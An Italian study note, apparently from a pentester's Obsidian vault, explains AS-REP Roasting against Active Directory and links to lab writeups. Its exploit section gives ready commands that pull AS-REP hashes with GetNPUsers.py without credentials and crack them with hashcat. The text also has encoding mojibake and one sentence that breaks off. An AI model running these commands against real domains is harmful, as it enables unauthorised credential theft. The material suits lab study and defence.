#Privesc_AD

---
#### INDICE

- [[#Introduzione]]
- [[#Exploit]]

---
---
---
### Introduzione
Lâ€™attacco **AS-REP Roasting** Ã¨ una tecnica di **Kerberos pre-authentication abuse** che consente a un attaccante non autenticato di ottenere hash crackabili offline per utenti di Active Directory che hanno la flag *â€œDoes not require Kerberos preauthenticationâ€* abilitata.

Non richiede credenziali valide.  
Non lascia log evidenti (a differenza di password bruteforce).  
Ãˆ sfruttabile da una macchina collegata al dominio o anche solo con l'accesso alla porta LDAP (TCP/389).

Quando un utente **non richiede pre-autenticazione Kerberos**, Ã¨ possibile richiedere un ticket AS-REP direttamente, ottenendo un blob cifrato con la chiave derivata dalla password dell'utente.  
Questo blob puÃ² poi essere sottoposto a cracking offline (es. con `hashcat`) per ottenere la password in chiaro.

Questa condizione Ã¨ disabilitata di default, ma puÃ² essere abilitata intenzionalmente o per errore su:
- account di servizio
- account legacy
- ambienti lab/malconfigurati

---
### Exploit
Per controllare se l'account

```
GetNPUsers.py -dc-ip <DC_IP> <domain>/ -usersfile users.txt -outputfile hashes.asrep
```

> âš ï¸ Funziona anche **senza autenticazione** se il controller LDAP Ã¨ accessibile.

Una volta ottenuto gli hash degli utenti, possiamo craccare le password con:

```
hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt
```

L'hash Ã¨ del tipo `$krb5asrep$23$...` e puÃ² essere processato da `hashcat` o `john`.

ğŸ“šâ€‹ Writeups:
[[ğŸ“š WRITEUPS/ğŸŒ Ambienti/Active Directory#Attacktive Directory| Timelapse]],[[ğŸ“š WRITEUPS/ğŸŒ Ambienti/Active Directory#Forest| Forest]],[[ğŸ“š WRITEUPS/ğŸŒ Ambienti/Active Directory#Nagoya| Nagoya]],[[ğŸ“š WRITEUPS/ğŸŒ Ambienti/Active Directory#Access| Access]],[[ğŸ“š WRITEUPS/ğŸŒ Ambienti/Active Directory#Enterprise| Enterprise]],[[ğŸ“š WRITEUPS/ğŸŒ Ambienti/Active Directory#Hokkaido| Hokkaido]],[[ğŸ“š WRITEUPS/ğŸŒ Ambienti/Active Directory#Breach| Breach]],[[ğŸ“š WRITEUPS/ğŸŒ Ambienti/Active Directory#Attacktive Directory| Attacktive Directory]],[[ğŸ“š WRITEUPS/ğŸŒ Ambienti/Active Directory#Hutch| Hutch]],[[ğŸ“š WRITEUPS/ğŸŒ Ambienti/Active Directory#Active| Active]],[[ğŸ“š WRITEUPS/ğŸŒ Ambienti/Active Directory#Administrator| Administrator]],